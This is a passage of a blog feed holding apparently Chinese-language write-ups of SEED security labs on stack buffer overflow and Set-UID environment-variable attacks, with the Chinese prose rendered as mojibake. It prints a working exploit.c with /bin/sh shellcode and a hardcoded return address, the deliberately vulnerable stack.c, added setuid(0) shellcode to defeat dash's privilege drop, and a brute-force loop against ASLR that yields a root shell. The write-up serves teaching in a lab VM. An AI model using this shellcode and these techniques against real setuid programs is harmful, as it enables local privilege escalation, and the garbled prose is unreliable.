stack.c</code>ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨-DBUF_SIZE=Né€‰é¡¹æ‰‹åŠ¨æŒ‡å®šç¼“å†²åŒºçš„å¤§å°</p></li><li><p>å°†stackæ›´æ”¹ä¸ºrootæ‰€æœ‰çš„setuidæ–‡ä»¶</p></li></ul><p>ä½¿ç”¨gdbå»è°ƒè¯•stackæ–‡ä»¶ï¼š</p><ul><li>b bofï¼Œåœ¨bofä¸‹æ–­ç‚¹</li><li>x/16xw bufferè§‚å¯Ÿbufferåœ°å€ä»¥åŠå…¶å†…å®¹</li><li>p $ebpæ‰“å°å‡ºæ ˆæŒ‡é’ˆçš„å€¼</li><li>$ebp+4å°±æ˜¯è¿”å›åœ°å€</li></ul><p>é€šè¿‡gdbè°ƒè¯•å‘ç°ï¼š</p><ul><li>bufferåœ°å€ä¸ºï¼š0xbfffeb18</li><li>ebpåœ°å€ä¸ºï¼š0xbfffeb38</li><li><code>p/d $ebp-0xffffcf84=32</code>ï¼Œä¹Ÿå³æ˜¯è¯´ï¼Œebpåœ¨bufferä¸Šé¢32å­—èŠ‚çš„ä½ç½®</li><li>è¿”å›åœ°å€ä¸ºbufferä¸Šé¢36å­—èŠ‚çš„ä½ç½®</li></ul><p><img src="/image/20221124205928.png"></p><p>exploit.cï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* exploit.c  */</span><br><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>             <span class="hljs-comment">/* xorl    %eax,%eax              */</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>           <span class="hljs-comment">/* pushl   $0x68732f2f            */</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>           <span class="hljs-comment">/* pushl   $0x6e69622f            */</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ebx              */</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                 <span class="hljs-comment">/* pushl   %ebx                   */</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ecx              */</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                 <span class="hljs-comment">/* cdq                            */</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>             <span class="hljs-comment">/* movb    $0x0b,%al              */</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>             <span class="hljs-comment">/* int     $0x80                  */</span><br>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br><br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span> <br>    <span class="hljs-built_in">memcpy</span>(buffer+<span class="hljs-number">36</span>,<span class="hljs-string">&quot;\x7c\xeb\xff\xbf&quot;</span>,<span class="hljs-number">4</span>);<span class="hljs-comment">//0xbf ff eb 7c</span><br>    <span class="hljs-built_in">strcpy</span>(buffer+<span class="hljs-number">100</span>,shellcode);<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = fopen(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    fwrite(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    fclose(badfile);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ„é€ bufferï¼Œå°†åŸæœ¬çš„è¿”å›åœ°å€è¦†ç›–ä¸º0xbf ff eb 7cï¼Œæ³¨æ„è¿™é‡Œæ˜¯å°ç«¯åºï¼Œå› æ­¤ä½¿ç”¨<code>memcpy(buffer+36,&quot;\x7c\xeb\xff\xbf&quot;,4);</code></li><li>0xbf ff eb 7cæ˜¯buffer+100çš„åœ°å€ï¼Œå› æ­¤shellcodeéœ€è¦ä»buffer+100èµ·å§‹</li></ul><p>stack.cï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Vunlerable program: stack.c */</span><br><span class="hljs-comment">/* You can get this program from the lab&#x27;s website */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 0 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 24</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[BUF_SIZE];<br><br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);       <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>     <span class="hljs-comment">/* Change the size of the dummy array to randomize the parameters</span><br><span class="hljs-comment">       for this lab. Need to use the array at least once */</span><br>    <span class="hljs-keyword">char</span> dummy[BUF_SIZE];  <span class="hljs-built_in">memset</span>(dummy, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">517</span>, badfile);<br>    bof(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>bofå‡½æ•°<code>strcpy(buffer, str);</code>  è¯­å¥å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</li><li>strå­˜å‚¨badfileä¸­çš„å†…å®¹ï¼Œä½¿ç”¨exploitç”Ÿæˆæ¶æ„å†…å®¹</li></ul><h1 id="Task-3-Defeating-dashâ€™s-Countermeasure"><a href="#Task-3-Defeating-dashâ€™s-Countermeasure" class="headerlink" title="Task 3: Defeating dashâ€™s Countermeasure"></a>Task 3: Defeating dashâ€™s Countermeasure</h1><p>dashæœ‰ä¸€ä¸ªé˜²å¾¡æœºåˆ¶ï¼Œå½“å‘ç°euidå’ŒçœŸå®idä¸ä¸€æ ·çš„æ—¶å€™ï¼Œå°±ä¼šæ”¾å¼ƒç‰¹æƒ</p><p>å› æ­¤æ”»å‡»setuidç¨‹åºçš„æ—¶å€™ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šæ‰‹åŠ¨å°†/bin/shæŒ‡å‘åˆ«çš„shellã€‚æ¯”å¦‚zshï¼Œè€Œè¿™ä¸ªä»»åŠ¡è¦æ±‚æˆ‘ä»¬åœ¨dashçš„æƒ…å†µä¸‹å¾—åˆ°root shell</p><p>æ€è·¯ï¼š</p><ul><li>åœ¨Task2çš„shellcodeæœ€å¼€å¤´åŠ ä¸Šsetuid(0)å¯¹åº”çš„äºŒè¿›åˆ¶ä»£ç </li></ul><p>é¦–å…ˆå°†shæŒ‡å‘dash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>dash <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">`<span class="hljs-string">&quot;\x31\xc0&quot;</span> <span class="hljs-comment">/* Line 1: xorl %eax,%eax */</span><br><span class="hljs-string">&quot;\x31\xdb&quot;</span> <span class="hljs-comment">/* Line 2: xorl %ebx,%ebx */</span><br><span class="hljs-string">&quot;\xb0\xd5&quot;</span> <span class="hljs-comment">/* Line 3: movb $0xd5,%al */</span><br><span class="hljs-string">&quot;\xcd\x80&quot;</span> <span class="hljs-comment">/* Line 4: int $0x80 */</span><br></code></pre></td></tr></table></figure><p>å°†ä¸Šé¢çš„ä»£ç åŠ åˆ°shellcodeä¹‹åï¼Œé‡æ–°ç¼–è¯‘exploit.cï¼Œè¿è¡Œexploitï¼Œå¯ä»¥å¾—åˆ°#ï¼Œä½†æ˜¯å¦‚æœä¸åŠ ä¸Šé¢ä»£ç ï¼Œåˆ™åªèƒ½å¾—åˆ°$ï¼Œä¸é¢„è®¡ç›¸ç¬¦åˆ</p><h1 id="Task-4-Defeating-Address-Randomization"><a href="#Task-4-Defeating-Address-Randomization" class="headerlink" title="Task 4: Defeating Address Randomization"></a>Task 4: Defeating Address Randomization</h1><p>ASLRï¼š</p><ul><li>åœ¨32ä½ Linux æœºå™¨ä¸Šï¼Œå †æ ˆåªæœ‰19ä½çš„ç†µ</li><li>è¿™æ„å‘³ç€å †æ ˆåŸºåœ°å€å¯ä»¥æœ‰219 = 524,288ç§å¯èƒ½æ€§</li></ul><p>æ‰“å¼€åœ°å€éšæœºåŒ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹ shell è„šæœ¬åœ¨æ— é™å¾ªç¯ä¸­è¿è¡Œæ˜“å—æ”»å‡»çš„ç¨‹åºã€‚å¦‚æœæ”»å‡»æˆåŠŸï¼Œè„šæœ¬å°†åœæ­¢; å¦åˆ™ï¼Œè„šæœ¬å°†ç»§ç»­è¿è¡Œ</p><ul><li>æœ¬è´¨ä¸Šè¿™ä¸ªè„šæœ¬å…¶å®å°±æ˜¯ä¸æ–­çš„è¿è¡Œstackï¼Œæ ¸å¿ƒä»£ç åªæœ‰./stackè¿™ä¸€å¥</li><li>åˆ«çš„ä»£ç éƒ½æ˜¯è®¡æ—¶ç”¨çš„</li><li>å‘½åä¸ºattach.shï¼Œç„¶åchmod +x èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œ./attackè¿è¡Œè„šæœ¬</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>SECONDS=0<br><br>value=0<br>while [ 1 ]<br>do<br>    value=$(( $value + 1 ))<br>    duration=$SECONDS<br>    min=$(($duration / 60))<br>    sec=$(($duration % 60))<br>    echo &quot;$min minutes and $sec seconds elapsed.&quot;<br>    echo &quot;The program has been running $value times so far.&quot;<br>    ./stack<br>done<br></code></pre></td></tr></table></figure><p>æœ€çº¢èŠ±äº†ä¸€åˆ†å¤šé’Ÿå°±éå†å¾—åˆ°äº†root shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span> minutes and <span class="hljs-number">31</span> seconds elapsed.<br><span class="hljs-attribute">The</span> program has been running <span class="hljs-number">45135</span> times so far.<br><span class="hljs-comment">#     </span><br></code></pre></td></tr></table></figure><h1 id="Task-5-Turn-on-the-StackGuard-Protection"><a href="#Task-5-Turn-on-the-StackGuard-Protection" class="headerlink" title="Task 5: Turn on the StackGuard Protection"></a>Task 5: Turn on the StackGuard Protection</h1><p>Stack Guard ä½¿ç”¨ Canaries æ£€éªŒå †æ ˆæ˜¯å¦è¢«ä¿®æ”¹æˆ–è€…è¦†ç›–</p><p>å‡è®¾æ‰“å¼€Stack Guardï¼Œä¼šaborté”™è¯¯</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">*** </span>stack smashing detected <span class="hljs-strong">***</span>: ./test terminated<br>Aborted<br></code></pre></td></tr></table></figure><h1 id="Task-6-Turn-on-the-Non-executable-Stack-Protection"><a href="#Task-6-Turn-on-the-Non-executable-Stack-Protection" class="headerlink" title="Task 6: Turn on the Non-executable Stack Protection"></a>Task 6: Turn on the Non-executable Stack Protection</h1><p>æ‰“å¼€å †æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -o stack -fno-stack-protector -z noexecstack stack.c<br></code></pre></td></tr></table></figure><p>å‡ºç°æ®µé”™è¯¯</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šEnvironment Variable and Set-UID Program Lab</title>
    <link href="/p/c51248f4/"/>
    <url>/p/c51248f4/</url>
    
    <content type="html"><![CDATA[<h1 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h1><p>ç¯å¢ƒå˜é‡æ˜¯ä¸ªä»¥=å·è¿æ¥çš„é”®å€¼å¯¹ï¼Œæ˜¯éšå¼ä¼ å…¥ç¨‹åºä¸­çš„</p><ul><li>printenvå’Œenvå‘½ä»¤å¯ä»¥åœ¨shellä¸­æ‰“å°å‡ºå½“å‰çš„ç¯å¢ƒå˜é‡<ul><li>ä½¿ç”¨grepè·å–æŸä¸ªç‰¹å®šå€¼</li></ul></li><li>exportå‘½ä»¤å’Œunsetå‘½ä»¤åˆ†åˆ«å¯ä»¥è®¾ç½®å’Œå»é™¤ç¯å¢ƒå˜é‡</li></ul><h1 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h1><p>ä½¿ç”¨gccå‘½ä»¤ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†çˆ¶å­è¿›ç¨‹printenvçš„ç»“æœåˆ†åˆ«é‡å®šå‘åˆ°ä¸¤ä¸ªä¸åŒçš„æ–‡ä»¶aå’Œbï¼Œå¹¶ç”¨diff a bå‘½ä»¤è¿›è¡Œæ¯”å¯¹ï¼Œå‘ç°æ²¡æœ‰åŒºåˆ«</p><p>è¿™è¯´æ˜é€šè¿‡forkçš„æ–¹å¼äº§ç”Ÿçš„çˆ¶å­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡æ˜¯ç›¸åŒçš„</p><h1 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and execve()</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  execve(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, <span class="hljs-literal">NULL</span>);  <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢çš„ç¨‹åºæ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œè¯´æ˜è¯¥è¿›ç¨‹æ²¡æœ‰ç»§æ‰¿ä»»ä½•çš„ç¯å¢ƒå˜é‡</p><p>å°†<code>execve(&quot;/usr/bin/env&quot;, argv, NULL);  </code>è¯­å¥ä¿®æ”¹ä¸º<code>execve(&quot;/usr/bin/env&quot;, argv, environ);  </code>å‘ç°å¯ä»¥æ‰“å°å‡ºç¯å¢ƒå˜é‡</p><p>å› æ­¤execveæœ€åä¸€ä¸ªå‚æ•°å¦‚æœä¸æŒ‡å®šçš„è¯ï¼Œæ˜¯é»˜è®¤ä¸ä¼ é€’ä»»ä½•ç¯å¢ƒå˜é‡çš„</p><h1 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and system()</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The  <span class="hljs-keyword">system</span>()  library  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uses</span> <span class="hljs-title">fork</span>(<span class="hljs-title">2</span>) <span class="hljs-title">to</span> <span class="hljs-title">create</span> <span class="hljs-title">a</span> <span class="hljs-title">child</span> <span class="hljs-title">process</span></span><br>   that executes <span class="hljs-keyword">the</span> <span class="hljs-built_in">shell</span> <span class="hljs-keyword">command</span> <span class="hljs-title">specified</span> <span class="hljs-title">in</span> <span class="hljs-title">command</span> <span class="hljs-title">using</span> <span class="hljs-title">execl</span>(<span class="hljs-title">3</span>)  <span class="hljs-title">as</span><br>   follows:<br><br>       execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-keyword">command</span>, (<span class="hljs-title">char</span> *) <span class="hljs-title">NULL</span>);<br><br>   <span class="hljs-keyword">system</span>() returns <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span> <span class="hljs-title">has</span> <span class="hljs-title">been</span> <span class="hljs-title">completed</span>.<br><br>   During  execution  <span class="hljs-keyword">of</span>  <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span>, <span class="hljs-title">SIGCHLD</span> <span class="hljs-title">will</span> <span class="hljs-title">be</span> <span class="hljs-title">blocked</span>, <span class="hljs-title">and</span> <span class="hljs-title">SIGINT</span><br>   <span class="hljs-keyword">and</span> SIGQUIT will be  ignored,  <span class="hljs-keyword">in</span>  <span class="hljs-keyword">the</span>  <span class="hljs-built_in">process</span>  that  calls  <span class="hljs-keyword">system</span>().<br>   (These  signals  will be handled according <span class="hljs-built_in">to</span> their defaults inside <span class="hljs-keyword">the</span><br>   child <span class="hljs-built_in">process</span> that executes command.)<br><br>   If <span class="hljs-keyword">command</span> <span class="hljs-title">is</span> <span class="hljs-title">NULL</span>, <span class="hljs-title">then</span> <span class="hljs-title">system</span>() <span class="hljs-title">returns</span> <span class="hljs-title">a</span> <span class="hljs-title">status</span> <span class="hljs-title">indicating</span> <span class="hljs-title">whether</span> <span class="hljs-title">a</span><br>   <span class="hljs-built_in">shell</span> is available <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">system</span>.<br><br></code></pre></td></tr></table></figure><h1 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>sudo chown root a.out <br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>sudo chmod <span class="hljs-number">4755</span> a.out <br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>ll a.out <br>-rwsr-xr-x <span class="hljs-number">1</span> root seed <span class="hljs-number">16760</span> Oct <span class="hljs-number">31</span> 04<span class="hljs-symbol">:</span>03 a.out<br><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>export PATH=<span class="hljs-string">&quot;/usr/bin&quot;</span><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>export LD_LIBRARY_PATH=<span class="hljs-string">&quot;wdnmd&quot;</span><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>export wdnmd=<span class="hljs-string">&quot;nmsl&quot;</span><br></code></pre></td></tr></table></figure><ul><li><p>PATH:å¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„</p></li><li><p>LD_LIBRARY_PATH:ç”¨äºå‘Šè¯‰åŠ¨æ€é“¾æ¥åŠ è½½å™¨åœ¨å“ªé‡Œå¯»æ‰¾ç‰¹å®šåº”ç”¨ç¨‹åºçš„å…±äº«åº“</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>        i++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ç¨‹åºæ‰“å°å‡ºç¯å¢ƒå˜é‡çš„å€¼ï¼Œå‘ç°PATHå’Œwdnmdè¢«æ›´æ”¹ï¼ŒLD_LIBRARY_PATHæ²¡æœ‰è¢«æ›´æ”¹</p><h1 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h1><p>ä½¿ç”¨<code>export PATH=$PWD:$PATH</code>å‘½ä»¤å°†/home/seedåŠ åˆ°pathç¯å¢ƒå˜é‡çš„å‰é¢</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹ä¸Šé¢çš„ç¨‹åºï¼Œå½“å®ƒæ‰§è¡Œçš„æ—¶å€™ä¼šforkå‡ºè¿›ç¨‹ç„¶åæ‰§è¡Œlsç¨‹åº</p><p>å°†/bin/lså¤åˆ¶åˆ°å½“å‰ç›®å½•ï¼Œä¿®æ”¹ä¸ºsuidç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code 